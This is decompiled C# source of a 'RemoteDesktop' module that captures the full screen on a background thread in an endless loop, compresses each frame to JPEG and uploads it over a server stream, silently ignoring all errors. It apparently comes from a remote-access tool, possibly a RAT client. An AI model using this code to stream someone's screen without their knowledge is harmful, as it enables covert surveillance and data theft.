using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

// Token: 0x02000007 RID: 7
[StandardModule]
internal sealed class RemoteDesktop
{
	// Token: 0x06000074 RID: 116 RVA: 0x00009190 File Offset: 0x00007390
	public static void startsc(object interval)
	{
		if (RemoteDesktop.newt.ThreadState == ThreadState.Running)
		{
			RemoteDesktop.newt.Abort();
		}
		RemoteDesktop.newt = new Thread(new ParameterizedThreadStart(RemoteDesktop.sc));
		RemoteDesktop.newt.IsBackground = true;
		RemoteDesktop.newt.SetApartmentState(ApartmentState.STA);
		RemoteDesktop.newt.Start(RuntimeHelpers.GetObjectValue(interval));
	}

	// Token: 0x06000075 RID: 117 RVA: 0x000091F0 File Offset: 0x000073F0
	public static void endsc()
	{
		try
		{
			RemoteDesktop.newt.Abort();
		}
		catch (Exception ex)
		{
		}
	}

	// Token: 0x06000076 RID: 118 RVA: 0x00009228 File Offset: 0x00007428
	public static void sc(object interval)
	{
		for (;;)
		{
			try
			{
				RemoteDesktop.g = Graphics.FromImage(RemoteDesktop.screenGrab);
				Graphics graphics = RemoteDesktop.g;
				Point point = new Point(0, 0);
				Point upperLeftSource = point;
				Point upperLeftDestination = new Point(0, 0);
				graphics.CopyFromScreen(upperLeftSource, upperLeftDestination, RemoteDesktop.screenSize);
				RemoteDesktop.resize = new Bitmap(RemoteDesktop.screenGrab, (int)Math.Round((double)RemoteDesktop.screenGrab.Width / 1.3), (int)Math.Round((double)RemoteDesktop.screenGrab.Height / 1.3));
				RemoteDesktop.resize.SetResolution(222f, 222f);
				ImageCodecInfo encoder = RemoteDesktop.get_Codec("image/jpeg");
				EncoderParameters encoderParameters = new EncoderParameters(1);
				encoderParameters.Param[0] = new EncoderParameter(Encoder.Quality, 35L);
				MemoryStream stream = new MemoryStream();
				RemoteDesktop.resize.Save(stream, encoder, encoderParameters);
				RemoteDesktop.tojpg = (Bitmap)Image.FromStream(stream);
				Functions.uploadserialized(Server.nstream, RemoteDesktop.tojpg);
				object instance = null;
				Type typeFromHandle = typeof(Thread);
				string memberName = "Sleep";
				object[] array = new object[]
				{
					RuntimeHelpers.GetObjectValue(interval)
				};
				object[] arguments = array;
				string[] argumentNames = null;
				Type[] typeArguments = null;
				bool[] array2 = new bool[]
				{
					true
				};
				NewLateBinding.LateCall(instance, typeFromHandle, memberName, arguments, argumentNames, typeArguments, array2, true);
				if (array2[0])
				{
					interval = RuntimeHelpers.GetObjectValue(array[0]);
				}
				RemoteDesktop.resize.Dispose();
				RemoteDesktop.tojpg.Dispose();
			}
			catch (Exception ex)
			{
			}
		}
	}

	// Token: 0x06000077 RID: 119 RVA: 0x000093B0 File Offset: 0x000075B0
	public static ImageCodecInfo get_Codec(string type)
	{
		if (type == null)
		{
			return null;
		}
		foreach (ImageCodecInfo imageCodecInfo in RemoteDesktop.codecs)
		{
			if (Operators.CompareString(imageCodecInfo.MimeType, type, false) == 0)
			{
				return imageCodecInfo;
			}
		}
		return null;
	}

	// Token: 0x0400001F RID: 31
	private static Size screenSize = new Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

	// Token: 0x04000020 RID: 32
	private static Bitmap screenGrab = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);

	// Token: 0x04000021 RID: 33
	private static Bitmap resize = null;

	// Token: 0x04000022 RID: 34
	private static Bitmap tojpg = null;

	// Token: 0x04000023 RID: 35
	private static Graphics g;

	// Token: 0x04000024 RID: 36
	private static Thread newt = new Thread(new ParameterizedThreadStart(RemoteDesktop.sc));

	// Token: 0x04000025 RID: 37
	private static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();
}
